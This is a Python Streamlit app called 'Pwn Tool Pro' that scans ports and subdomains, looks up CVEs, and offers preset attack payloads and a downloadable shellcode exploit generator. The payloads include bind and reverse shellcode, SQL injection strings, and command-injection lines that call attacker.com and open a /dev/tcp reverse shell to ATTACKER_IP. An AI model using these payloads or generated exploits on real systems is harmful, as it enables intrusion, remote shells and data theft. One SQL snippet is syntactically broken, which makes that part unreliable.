import streamlit as st

# Must be first
st.set_page_config(
    page_title="Pwn Tool",
    page_icon="🔥",
    layout="wide", 
    initial_sidebar_state="expanded"
)

# Import pwntools context after Streamlit
from pwn_context import PWN_CONTEXT, PWN_ERROR
PWNCTX = PWN_CONTEXT
PWNTOOLS_ERROR = PWN_ERROR

# Import non-Streamlit modules
import sys
import os
from datetime import datetime
from dotenv import load_dotenv
import socket
import requests
import re
from concurrent.futures import ThreadPoolExecutor
from googletrans import Translator

def show_pwntools_error():
    """Affiche l'erreur d'initialisation de pwntools si elle existe"""
    if PWNTOOLS_ERROR and not PWNCTX:
        st.error(f"❌ Erreur d'initialisation pwntools: {PWNTOOLS_ERROR}")
        st.info("💡 Pour installer pwntools:\n```bash\npip install --upgrade pwntools\n```")
        return True
    return False

# Initialize context management functions
def init_context(arch='amd64', os='linux', log_level='debug'):
    """Initialise le contexte pwntools de manière sécurisée"""
    try:
        if PWNCTX:
            PWNCTX.arch = arch
            PWNCTX.os = os
            PWNCTX.log_level = log_level
            return True
        return False
    except Exception as e:
        st.error(f"❌ Erreur d'initialisation du contexte: {str(e)}")
        return False

# Initialize session state
if 'session_state' not in st.session_state:
    st.session_state['session_state'] = {
        'analysis_results': None,
        'selected_payload': None,
        'custom_payload': None,
    }

# Supprimer tout code existant lié à la sélection de langue
# Définir une seule fois le sélecteur de langue
def create_language_selector():
    lang_col1, lang_col2 = st.columns([6, 1])
    with lang_col2:
        return st.radio(
            label="Sélectionner la langue / Select language",
            options=["🇫🇷 FR", "🇬🇧 EN"]
        )

# Initialisation de la langue par défaut dans session_state
if 'language' not in st.session_state:
    st.session_state['language'] = "🇫🇷 FR"

# Définition de la variable current_lang basée sur le sélecteur de langue
current_lang = st.sidebar.radio(
    "Sélectionner la langue / Select language",
    ["🇫🇷 FR", "🇬🇧 EN"],
    key="language_selector"
)

# Mettre à jour la langue dans session_state
st.session_state['language'] = current_lang

def scan_port(host, port):
    """Scan d'un port avec gestion d'erreurs améliorée"""
    try:
        # Nettoyer l'URL pour obtenir le hostname
        if host.startswith(('http://', 'https://')):
            from urllib.parse import urlparse
            parsed = urlparse(host)
            host = parsed.netloc
            # Supprimer le port s'il est dans l'URL
            if ':' in host:
                host = host.split(':')[0]
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)
            result = s.connect_ex((host, port))
            if result == 0:
                return port
            return None
    except socket.gaierror:
        st.error(f"❌ Erreur de résolution de nom pour: {host}")
        return None
    except socket.error as e:
        st.error(f"❌ Erreur de connexion: {str(e)}")
        return None

def get_service_banner(host, port, timeout=2):
    """Tente d'obtenir la bannière du service sur un port donné"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((host, port))
            # Envoie quelques requêtes communes
            probes = [
                b'HEAD / HTTP/1.0\r\n\r\n',
                b'GET / HTTP/1.0\r\n\r\n',
                b'\r\n',
                b'HELP\r\n',
                b'VERSION\r\n'
            ]
            banner = ''
            for probe in probes:
                try:
                    s.send(probe)
                    banner = s.recv(1024).decode('utf-8', errors='ignore')
                    if banner:
                        break
                except:
                    continue
            return banner.strip() if banner else "Service détecté, pas de bannière"
    except:
        return None

def service_detection(host, port):
    """Détecte le service en fonction du port et de la bannière"""
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        80: "HTTP",
        443: "HTTPS",
        445: "SMB",
        3306: "MySQL",
        3389: "RDP",
        8080: "HTTP-Proxy"
    }
    banner = get_service_banner(host, port)
    service = common_ports.get(port, "Unknown")
    if banner:
        return f"Port {port} ({service}): {banner}"
    return f"Port {port} ({service}): Ouvert"

def auto_enum(target):
    """Énumération automatique de la cible avec plus de détails"""
    results = []
    try:
        # Nettoyage et validation de la cible
        domain = target
        if target.startswith(('http://', 'https://')):
            from urllib.parse import urlparse
            parsed = urlparse(target)
            domain = parsed.netloc
            # Supprimer le port s'il est dans l'URL
            if ':' in domain:
                domain = domain.split(':')[0]

        # Vérifier si le domaine est valide
        try:
            socket.gethostbyname(domain)
        except socket.gaierror:
            return f"❌ Erreur: Impossible de résoudre le domaine '{domain}'"

        results.append(f"🔍 Démarrage de l'analyse pour: {domain}")
        
        # Énumération des sous-domaines dans le thread principal
        results.append("\n📡 Recherche de sous-domains...")
        with st.spinner("Analyse des sous-domaines en cours..."):
            subdomains = enumerate_subdomains(domain)
            results.extend([f"  {line}" for line in subdomains.split('\n')])
        
        # Scan des ports
        results.append("\n🔍 Scan des ports...")
        common_ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]
        
        # Utiliser un contexte de progression distinct
        scan_progress = st.empty()
        open_ports = []
        
        for i, port in enumerate(common_ports):
            scan_progress.progress((i + 1) / len(common_ports))
            result = scan_port(target, port)
            if result:
                open_ports.append(result)
        
        scan_progress.empty()

        if not open_ports:
            results.append("ℹ️ Aucun port ouvert trouvé")
        else:
            results.append(f"✅ Ports ouverts trouvés: {open_ports}")
            
        # Détection de version avec nmap si des ports sont ouverts
        if open_ports:
            results.append("\n🔍 Analyse des services en cours...")
            for port in open_ports:
                try:
                    service_info = service_detection(target, port)
                    results.append(service_info)
                except Exception as e:
                    results.append(f"⚠️ Erreur sur port {port}: {str(e)}")
    except Exception as e:
        results.append(f"❌ Erreur: {str(e)}")
    return "\n".join(results)

# Ajoutez cette fonction pour la traduction
def translate_text(text, dest='en'):
    translator = Translator()
    try:
        return translator.translate(text, dest=dest).text
    except:
        return text

def search_cves(service_info):
    """Recherche les CVE associées aux services détectés via NVD API"""
    cve_results = []
    cve_results.append("🔍 Démarrage de la recherche de vulnérabilités via NVD...")
    try:
        for line in service_info.split('\n'):
            if 'Port' in line:
                service_match = re.search(r'Port (\d+) \(([^)]+)\):(.*)', line)
                if service_match:
                    port = service_match.group(1)
                    service = service_match.group(2)
                    version_info = service_match.group(3).strip()
                    cve_results.append(f"\n📌 Analyse du service: {service} (Port {port})")
                    
                    # Construction de la requête NVD
                    base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
                    params = {
                        "keywordSearch": f"{service}",
                        "resultsPerPage": 5
                    }
                    try:
                        response = requests.get(base_url, params=params, timeout=10)
                        if response.status_code == 200:
                            data = response.json()
                            vulns = data.get('vulnerabilities', [])
                            if not vulns:
                                cve_results.append(f"✅ Aucune vulnérabilité connue pour {service}")
                            else:
                                for vuln in vulns:
                                    cve = vuln['cve']
                                    cve_id = cve['id']
                                    description = cve.get('descriptions', [{}])[0].get('value', 'Pas de description')
                                    metrics = cve.get('metrics', {}).get('cvssMetricV31', [{}])[0]
                                    cvss_score = metrics.get('cvssData', {}).get('baseScore', 'N/A')
                                    
                                    # Convertir le score CVSS en nombre si possible
                                    try:
                                        cvss_score = float(cvss_score)
                                    except ValueError:
                                        cvss_score = 'N/A'
                                    
                                    # Émoji basé sur le score CVSS
                                    if isinstance(cvss_score, (int, float)):
                                        severity = "🔴" if cvss_score >= 7 else "🟡" if cvss_score >= 4 else "🟢"
                                    else:
                                        severity = "❓"
                                    
                                    cve_results.append(
                                        f"{severity} {cve_id} (CVSS: {cvss_score})\n"
                                        f"   └─ Description: {description[:200]}..."
                                    )
                        else:
                            cve_results.append(f"⚠️ Erreur API NVD: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        cve_results.append(f"⚠️ Erreur réseau: {str(e)}")
                        continue
        return "\n".join(cve_results)
    except Exception as e:
        return f"❌ Erreur globale: {str(e)}\n💡 Conseil: Vérifiez votre connexion Internet"

def load_subdomain_list():
    """Charge une liste de sous-domaines à partir d'un fichier distant"""
    try:
        url = "https://raw.githubusercontent.com/rbsec/dnscan/master/subdomains-10000.txt"
        response = requests.get(url)
        if (response.status_code == 200):
            return [line.strip() for line in response.text.splitlines() if line.strip()]
        return []
    except Exception as e:
        st.error(f"❌ Erreur lors du chargement de la liste des sous-domaines: {str(e)}")
        return []

def enumerate_subdomains(domain):
    """Énumère les sous-domaines d'un domaine donné avec une liste étendue"""
    subdomains = []
    found_count = 0
    max_subdomains = 100

    try:
        # Charger la liste des sous-domaines
        subdomain_list = load_subdomain_list()
        if not subdomain_list:
            return "Aucune liste de sous-domaines n'a pu être chargée"

        # Créer la barre de progression dans le contexte principal de Streamlit
        progress_placeholder = st.empty()
        total = len(subdomain_list)

        for i, sub in enumerate(subdomain_list):
            # Mise à jour de la progression
            progress = (i + 1) / total
            progress_placeholder.progress(progress)

            if found_count >= max_subdomains:
                subdomains.append(f"⚠️ Limite de {max_subdomains} sous-domaines atteinte")
                break

            subdomain = f"{sub}.{domain}"
            try:
                # Utiliser getaddrinfo au lieu de gethostbyname pour une meilleure fiabilité
                socket.getaddrinfo(subdomain, None)
                ip = socket.gethostbyname(subdomain)
                subdomains.append(f"✅ {subdomain:<50} -> {ip}")
                found_count += 1
            except socket.gaierror:
                continue
            except Exception as e:
                subdomains.append(f"❌ Erreur pour {subdomain}: {str(e)}")

        # Nettoyage de la barre de progression
        progress_placeholder.empty()

        if not subdomains:
            return "Aucun sous-domaine trouvé"

        summary = f"""
🔍 Résultats de l'énumération des sous-domaines pour {domain}:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Sous-domaines trouvés: {found_count}
✓ Sous-domaines testés: {i + 1}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        return summary + "\n".join(subdomains)

    except Exception as e:
        return f"❌ Erreur lors de l'énumération: {str(e)}"

# Style CSS pour l'interface moderne
st.markdown(
    """
    <style>
        .stApp {
            background-color: #000000;
        }
        .stTextInput, .stButton {
            margin-bottom: 15px;
        }
        .stTextInput > div > div > input, .stButton > button {
            border-radius: 5px;
            padding: 10px 15px;
            border: 1px solid #ccc;
        }
        .stButton > button {
            background-color: #007bff;
            color: white;
            border: none;
        }
        .stButton > button:hover {
            background-color: #0056b3;
        }
        .stTextArea > div > div > textarea {
            border-radius: 5px;
            padding: 10px 15px;
            border: 1px solid #ccc;
        }
    </style>
    """,
    unsafe_allow_html=True,
)

# Définition des textes selon la langue
texts = {
    "🇫🇷 FR": {
        "title": "🎯 Pwn Tool Pro",
        "target": "Cible (URL ou IP)",
        "analyze": "🚀 Analyse Automatique",
        "advanced": "🛠️ Options Avancées",
        "architecture": "Architecture",
        "shellcode": "Type de Shellcode",
        "port": "Port personnalisé",
        "payload": "Payload personnalisé (hex ou asm)",
        "presets": "Payloads prédéfinis",
        "generate": "⚡ Générer Exploit",
        "download": "📥 Télécharger le rapport",
        "warning": "⚠️ **Avertissement :** Utilisez cet outil de manière responsable et éthique.",
        "subdomain_scan": "🌐 Scanner les sous-domaines",
        "subdomain_results": "Résultats des sous-domaines",
        "loading_subdomains": "Chargement de la liste des sous-domaines...",
    },
    "🇬🇧 EN": {
        "title": "🎯 Pwn Tool Pro",
        "target": "Target (URL or IP)",
        "analyze": "🚀 Automatic Analysis",
        "advanced": "🛠️ Advanced Options",
        "architecture": "Architecture",
        "shellcode": "Shellcode Type",
        "port": "Custom Port",
        "payload": "Custom Payload (hex ou asm)",
        "presets": "Preset Payloads",
        "generate": "⚡ Generate Exploit",
        "download": "📥 Download Report",
        "warning": "⚠️ **Warning:** Use this tool responsibly and ethically.",
        "subdomain_scan": "🌐 Scan Subdomains",
        "subdomain_results": "Subdomain Results",
        "loading_subdomains": "Loading subdomain list...",
    }
}

# Mise à jour des textes de l'interface
st.title(texts[current_lang]["title"])
target = st.text_input(texts[current_lang]["target"])

if st.button(texts[current_lang]["analyze"]):
    if target:
        with st.spinner("Analyse en cours..."):
            # Analyse automatique
            analysis_results = auto_enum(target)
            # Afficher les résultats de l'énumération
            st.subheader("🔍 Résultats de l'énumération")
            st.code(analysis_results, language="text")
            # Rechercher et afficher les CVE
            st.subheader("🎯 Vulnérabilités potentielles (CVE)")
            with st.spinner("Recherche des CVE..."):
                cve_results = search_cves(analysis_results)
                st.code(cve_results, language="text")
            # Préparer le rapport complet
            full_report = f"""RAPPORT D'ANALYSE
============================
{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
============================
ÉNUMÉRATION
-----------
{analysis_results}

VULNÉRABILITÉS POTENTIELLES
---------------------------
{cve_results}
"""
            # Bouton de téléchargement
            st.download_button(
                label=texts[current_lang]["download"],
                data=full_report,
                file_name=f"pentest_report_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                mime="text/plain",
            )

# Après le bouton d'analyse existant
# Bouton de scan de sous-domaines avec une clé unique
if st.button(texts[current_lang]["subdomain_scan"], key="subdomain_scan_button"):
    if target:
        with st.spinner(texts[current_lang]["loading_subdomains"]):
            subdomain_results = enumerate_subdomains(target)
            st.subheader("🌐 " + texts[current_lang]["subdomain_results"])
            st.code(subdomain_results, language="text")

# Options avancées dans un expander
with st.expander(texts[current_lang]["advanced"]):
    col1, col2 = st.columns(2)
    with col1:
        # Sélection de l'architecture
        selected_arch = st.selectbox(
            texts[current_lang]["architecture"],
            ['amd64', 'i386', 'arm', 'aarch64'],
        )
        # Mise à jour du contexte après la sélection
        if PWNCTX:
            try:
                PWNCTX.arch = selected_arch
            except Exception as e:
                st.error(f"❌ Erreur lors du changement d'architecture: {str(e)}")
        shellcode_type = st.selectbox(
            texts[current_lang]["shellcode"],
            ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']
        )
    with col2:
        custom_port = st.number_input(texts[current_lang]["port"], min_value=1, max_value=65535, value=4444)
        # Création de deux colonnes pour le payload
        payload_col1, payload_col2 = st.columns([3, 1])
        # Définition du dictionnaire de payloads avant le selectbox
        payload_dict = {
            "Sélectionner...": {
                "code": "# Sélectionnez un payload dans la liste",
                "description": "Sélectionnez un payload prédéfinis"
            },
            "Linux x64 - Bind Shell": {
                "code": """# 1. Générez le shellcode
shellcode = asm(shellcraft.amd64.linux.bindsh(4444))
# 2. Lancez un listener sur la machine cible (port 4444)
# 3. Connectez-vous avec : nc <target_ip> 4444""",
                "description": "Ouvre un shell sur le port 4444"
            },
            "Linux x64 - Reverse Shell": {
                "code": """# 1. Lancez un listener sur votre machine
# nc -lvnp 4444
# 2. Remplacez ATTACKER_IP par votre IP
shellcode = asm(shellcraft.amd64.linux.connectback('ATTACKER_IP', 4444))""",
                "description": "Se connecte à l'attaquant sur le port 4444",
            },
            "Linux x64 - Execute /bin/sh": {
                "code": """# 1. Générez le shellcode
shellcode = asm(shellcraft.amd64.linux.sh())
# 2. Pour exécuter directement:
# p = process('./binary')
# p.sendline(shellcode)
# p.interactive()""",
                "description": "Exécute /bin/sh"
            },
            "Format String - Stack Leak": {
                "code": """# 1. Envoyez le payload pour fuiter la pile
payload = b'%x.' * 20
# 2. Pour analyser la réponse:
# response = p.recvline()
# print(response.decode())
# 3. Pour trouver des adresses spécifiques:
# memory_leak = response.split(b'.')[offset]""",
                "description": "Fuite de la pile"
            },
            "Format String - Memory Write": {
                "code": """# 1. Calculez l'offset de votre cible
payload = b'AAAA' + b'%x ' * 10
# 2. Écrivez à l'adresse cible
target_addr = 0x0804xxxx
write_payload = fmtstr_payload(offset, {target_addr: desired_value})""",
                "description": "Écriture en mémoire via format string",
            },
            "Buffer Overflow - Pattern": {
                "code": """# 1. Créez un pattern unique
pattern = cyclic(1000)
# 2. Trouvez l'offset après crash
# offset = cyclic_find(0x6161616161)
# 3. Construisez votre payload
# payload = flat(
# )""",
                "description": "Pattern cyclique pour trouver l'offset"
            },
            "SQL Injection - Basic": {
                "code": """# 1. Test d'authentification basique
payload = "' OR '1'='1"
# 2. Variantes utiles:
# admin' --
# ' OR 1=1 --
# ' UNION SELECT 1,2,3 --""",
                "description": "Injection SQL basique"
            },
            "SQL Injection - Union": {
                "code": """# 1. Détection du nombre de colonnes (méthode sécurisée)
def detect_columns(url, max_columns=10):
    for i in range(1, max_columns + 1):
        payload = f"' ORDER BY {i}-- -"
        response = requests.get(url + payload)
        if "error" in response.text.lower():
            return i - 1
    return max_columns
# 2. Test des colonnes exploitables
def test_columns(url, num_columns):
    nulls = ','.join(['NULL'] * num_columns)
    payload = f"' UNION SELECT {nulls}-- -"
    return requests.get(url + payload)
# 3. Extraction d'informations
def extract_info(url):
    # Tables
    tables_payload = "' UNION SELECT GROUP_CONCAT(table_schema,'.',table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -"
    # Colonnes (utiliser des requêtes préparées en production)
        return f"' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'-- -"
    return tables_payload, get_columns
# 4. Protection contre les injections
def secure_query(cursor, query, params):
    try:
        cursor.execute(query, params)
        return cursor.fetchall()
    except Exception as e:
        logging.error(f"Erreur SQL: {e}")
        return None""",
                "description": "Injection SQL UNION avec validation et sécurité renforcée"
            },
            "Command Injection - Basic": {
                "code": """# 1. Test d'injection simple
payload = "$(id)"
# 2. Variantes utiles:
# ;id
# |id
# `id`
# $(cat /etc/passwd)""",
                "description": "Injection de commande simple"
            },
            "Command Injection - Advanced": {
                "code": """# 1. Encodage base64 pour bypass
payload = "`whoami`|base64"
# 2. Autres techniques de bypass:
# $(curl http://attacker.com/$(whoami))
# $(echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64 -d | bash)""",
                "description": "Injection de commande avec encodage",
            }
        }
        with payload_col2:
            preset_payload = st.selectbox(
                texts[current_lang]["presets"],
                list(payload_dict.keys())
            )
            # Affichage de la description
            if preset_payload != "Sélectionner...":
                st.info(f"📝 {payload_dict[preset_payload]['description']}")
        with payload_col1:
            # Utilisation de st.text_area avec value pré-remplie
            custom_payload = st.text_area(
                texts[current_lang]["payload"],
                value=payload_dict[preset_payload]["code"],
                key="custom_payload"
            )

def validate_input(target, port, shellcode_type):
    """Valide les paramètres d'entrée"""
    if not target:
        st.error("❌ La cible est requise")
        return False
    if not 1 <= port <= 65535:
        st.error("❌ Le port doit être entre 1 et 65535")
        return False
    if shellcode_type not in ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']:
        st.error("❌ Type de shellcode non valide")
        return False
    return True

def create_exploit_file(shellcode_type, target, custom_port, selected_arch):
    """Crée le contenu du fichier exploit sans utiliser Streamlit"""
    try:
        if not PWNCTX:
            return None, "pwntools n'est pas initialisé"
            
        # Génération du shellcode
        try:
            shellcode = None
            if shellcode_type == 'shell_reverse_tcp':
                shellcode = PWNCTX.shellcraft.linux.connectback(target, custom_port)
            elif shellcode_type == 'shell_bind_tcp':
                shellcode = PWNCTX.shellcraft.linux.bindsh(custom_port)
            elif shellcode_type == 'execve':
                shellcode = PWNCTX.shellcraft.linux.sh()
            else:
                return None, "Type de shellcode non supporté"
                
            # Assemblage du shellcode
            assembled_shellcode = PWNCTX.asm(shellcode)
            
            # Template de l'exploit
            exploit_content = f"""#!/usr/bin/python3
from pwn import *

# Configuration
context.arch = '{selected_arch}'
context.os = 'linux'
context.log_level = 'info'

def exploit():
    try:
        print("[+] Démarrage de l'exploit...")
        target = '{target}'
        port = {custom_port}
        
        print(f"[*] Connexion à {{target}}:{{port}}")
        r = remote(target, port)
        
        print("[*] Envoi du shellcode...")
        shellcode = {repr(assembled_shellcode)}
        r.sendline(shellcode)
        print("[+] Shellcode envoyé avec succès")
        
        r.interactive()
        
    except Exception as e:
        print(f"[-] Erreur: {{str(e)}}")
        return False
    return True

if __name__ == '__main__':
    exploit()
"""
            return exploit_content, None
            
        except Exception as e:
            return None, f"Erreur lors de la génération du shellcode: {str(e)}"
            
    except Exception as e:
        return None, f"Erreur globale: {str(e)}"

def generate_exploit(shellcode_type, target, custom_port, selected_arch):
    """Génère un exploit selon les paramètres choisis"""
    exploit_content, error = create_exploit_file(shellcode_type, target, custom_port, selected_arch)
    
    if error:
        return f"""#!/usr/bin/python3
# {error}
# Pour installer pwntools:
# python3 -m pip install pwntools"""
    
    return exploit_content

# Modifier le bouton de génération
if st.button(texts[current_lang]["generate"]):
    if not PWNCTX:
        st.error("❌ pwntools n'est pas initialisé. Installez-le avec: pip install pwntools")
    elif validate_input(target, custom_port, shellcode_type):
        try:
            with st.spinner("Génération de l'exploit..."):
                exploit = generate_exploit(
                    shellcode_type=shellcode_type,
                    target=target,
                    custom_port=custom_port,
                    selected_arch=selected_arch
                )
                if exploit.startswith("#!/usr/bin/python3\n#"):
                    st.error(exploit.split('\n')[1].strip('# '))
                else:
                    st.code(exploit, language="python")
                    st.download_button(
                        label="📥 Télécharger l'exploit",
                        data=exploit,
                        file_name=f"exploit_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.py",
                        mime="text/plain",
                    )
        except Exception as e:
            st.error(f"❌ Erreur de génération: {str(e)}")

# Affichage des informations de débogage
if PWNCTX and PWNCTX.log_level == 'debug':
    with st.expander("🔍 Informations de Débogage"):
        st.code(f"""
Architecture: {PWNCTX.arch}
OS: {PWNCTX.os}
""", language="text")

# Conseils et avertissements
st.markdown("---")  # Séparateur
st.markdown(texts[current_lang]["warning"])

# Explications sur pwntools
st.markdown("## Utilisation de pwntools")
st.markdown("Cet outil utilise la bibliothèque `pwntools` pour interagir avec des services réseau.")
st.markdown("Voici quelques exemples de commandes `pwntools` que vous pouvez utiliser dans la zone d'interaction :")
st.markdown(
    """
    ```python
    r.recvline()  # Réception d'une ligne
    r.sendline(b"ls")  # Envoi d'une commande
    r.recvall()  # Réception de toutes les données
    r.interactive() # shell interactif
    ```
    """
)
st.markdown(
    "N'oubliez pas que vous devez utiliser [r](http://_vscodecontentref_/2) pour faire référence à la connexion établie avec la cible."
)

# Remplacer complètement cette partie
if PWNCTX:
    st.success("✅ pwntools est correctement initialisé et prêt à l'emploi!")
# Ne rien afficher si déjà prêt